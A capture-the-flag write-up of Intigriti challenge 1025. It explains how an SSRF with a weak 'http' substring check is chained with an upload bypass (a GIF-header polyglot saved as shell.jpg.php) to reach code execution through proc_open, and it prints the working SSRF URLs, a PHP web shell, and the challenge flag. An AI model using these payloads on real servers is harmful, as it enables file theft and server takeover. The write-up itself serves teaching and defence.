# Title: SSRF to RCE via File Upload Validation Bypass (Intigriti Challenge 1025)

- **Platform**: Intigriti
- **Program**: Intigriti October 2025 Challenge (#1025)
- **Severity**: Critical
- **Date**: 2025-10-14
- **Researcher**: isira_adithya, 40rbidd3n, Hamza Avvan
- **Bounty**: N/A (CTF Challenge)

## Summary
A server-side request forgery (SSRF) vulnerability was chained with weak upload validation to achieve remote code execution. The SSRF allowed reading Apache configuration to discover a hidden header-based auth gate. The upload functionality was bypassed using a polyglot file, and RCE was achieved via the `proc_open` function.

## Technical Details
The challenge application had a `challenge.php?url=` endpoint that was vulnerable to SSRF with weak validation — it only checked if the URL contained "http" substring. Bypassing with `file:///etc/passwd#http` allowed local file reading.

The researcher used the SSRF to read Apache configuration and discovered:
- The `/upload_shoppix_images.php` endpoint required a header `Is-Shoppix-Admin: true`
- File upload validation relied on `mime_content_type()` (must start with `image/`) and filename checks (must contain `.png`, `.jpg`, or `.jpeg`)

The bypass used a polyglot file — prepending `GIF87a` to trick MIME detection and naming the file `shell.jpg.php` to pass the filename check while executing as PHP.

Initial RCE attempts failed because `system`, `exec`, etc. were disabled. However, `proc_open` was available and was used for the final exploit.

## Steps to Reproduce
1. Use SSRF to read Apache config: `challenge.php?url=file:///etc/apache2/sites-available/000-default.conf#http`
2. Discover the header requirement: `Is-Shoppix-Admin: true`
3. Access upload endpoint with header
4. Create a polyglot PHP file with GIF header:
   ```
   GIF87a
   <?php $d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$p=proc_open($_GET['cmd'],$d,$pipes);echo stream_get_contents($pipes[1]);?>
   ```
5. Name the file `shell.jpg.php`
6. Upload the file
7. Execute commands: `/uploads/shell.jpg.php?cmd=cat%20/93e892fe-c0af-44a1-9308-5a58548abd98.txt`

## Proof of Concept
SSRF for config reading:
```
https://challenge-1025.intigriti.io/challenge.php?url=file:///etc/apache2/sites-available/000-default.conf%23http
```

Upload bypass payload (filename: `exploit.jpg.php`):
```
GIF87a
<?php proc_open("/readflag", $pipes, $pipes); ?>
```

Flag: `INTIGRITI{ngks896sdjvsjnv6383utbgn}`

## Impact
- Complete server compromise
- Local file reading via SSRF
- Remote code execution via upload bypass
- Bypass of disabled PHP functions through `proc_open`

## Remediation
The challenge was a CTF, so no remediation was applied. In production:
- SSRF protection should not rely on simple substring checks
- File upload validation should not rely solely on MIME type
- Filename validation should prevent double extensions
- Disabled functions should include `proc_open`

## References
- https://blog.isiraadithya.com/posts/intigriti-1025-challege-writeup
- https://40rbidd3n.medium.com/intigriti-challenge-1025-badc6a24caf9
- https://hamzaavvan.medium.com/getting-rce-challenge-1025-by-intigriti-b3d0033a286d
